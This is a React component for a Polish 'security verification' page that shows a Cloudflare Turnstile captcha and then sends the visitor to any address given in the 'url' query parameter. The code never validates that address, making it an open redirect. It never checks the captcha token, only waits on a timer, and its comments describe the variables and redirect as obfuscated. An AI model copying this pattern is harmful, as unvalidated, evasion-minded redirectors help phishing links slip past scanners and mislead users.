import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";

declare global {
  interface Window {
    turnstile: {
      render: (element: string | HTMLElement, options: any) => void;
      getResponse: (widgetId?: string) => string;
    };
  }
}

const Redirect = () => {
  const [searchParams] = useSearchParams();
  const u = searchParams.get('url');
  const t = searchParams.get('title');
  const [cD, setCd] = useState(5);
  const [iV, setIv] = useState(false);
  const [iL, setIl] = useState(false);
  const tRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!u) return;

    // Custom Turnstile initialization with obfuscated vars
    const initT = () => {
      if (window.turnstile && tRef.current) {
        window.turnstile.render(tRef.current, {
          sitekey: '0x4AAAAAABvUxH4dUnt3WySr',
          callback: (tk: string) => {
            vToken(tk);
          },
        });
      }
    };

    // Custom polling instead of standard approach
    if (window.turnstile) {
      initT();
    } else {
      let chkCount = 0;
      const chkT = () => {
        chkCount++;
        if (window.turnstile) {
          initT();
        } else if (chkCount < 100) {
          setTimeout(chkT, 100);
        }
      };
      chkT();
    }
  }, [u]);

  const vToken = async (tk: string) => {
    setIl(true);
    try {
      // Custom delay implementation
      await new Promise(r => {
        let delay = 1000;
        const customTimer = () => {
          delay -= 10;
          if (delay <= 0) {
            r(null);
          } else {
            setTimeout(customTimer, 10);
          }
        };
        customTimer();
      });
      setIv(true);
      startRedir();
    } catch (e) {
      console.error('Ver failed:', e);
      setIl(false);
    }
  };

  const startRedir = () => {
    setIl(false);
    // Custom redirect with obfuscation
    const rTime = 100;
    const customRedirect = () => {
      const loc = window.location;
      loc.href = u!;
    };
    setTimeout(customRedirect, rTime);
  };

  if (!u) {
    return (
      <div className="min-h-screen bg-gray-400 pt-2.5 p-4 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-2xl p-6 max-w-lg mx-auto w-full text-center">
          <h1 className="text-xl font-bold text-gray-900">Błąd</h1>
          <p className="text-gray-600 mt-2">Brak adresu URL do przekierowania.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-400 pt-2.5 p-4 flex items-center justify-center">
      <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-lg mx-auto w-full text-center">
        {!iV && !iL && (
          <>
            <div className="mb-6">
              <h1 className="text-xl font-bold text-gray-900 mb-2">Weryfikacja bezpieczeństwa</h1>
              {t && (
                <p className="text-gray-600 mb-4 text-sm">{t}</p>
              )}
              <p className="text-gray-500 text-sm mb-4">
                Potwierdź, że nie jesteś robotem, aby przejść dalej
              </p>
            </div>
            <div ref={tRef} className="flex justify-center"></div>
          </>
        )}
        
        {iL && (
          <>
            <div className="animate-spin w-12 h-12 border-4 border-gray-300 border-t-blue-600 rounded-full mx-auto mb-4"></div>
            <h1 className="text-xl font-bold text-gray-900 mb-2">Weryfikacja...</h1>
            <p className="text-gray-500 text-sm">
              Sprawdzanie bezpieczeństwa
            </p>
          </>
        )}
        
        {iV && !iL && (
          <>
            <div className="w-12 h-12 bg-green-500 rounded-full mx-auto mb-4 flex items-center justify-center">
              <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-xl font-bold text-gray-900 mb-2">Przekierowywanie...</h1>
            {t && (
              <p className="text-gray-600 mb-4 text-sm">{t}</p>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default Redirect;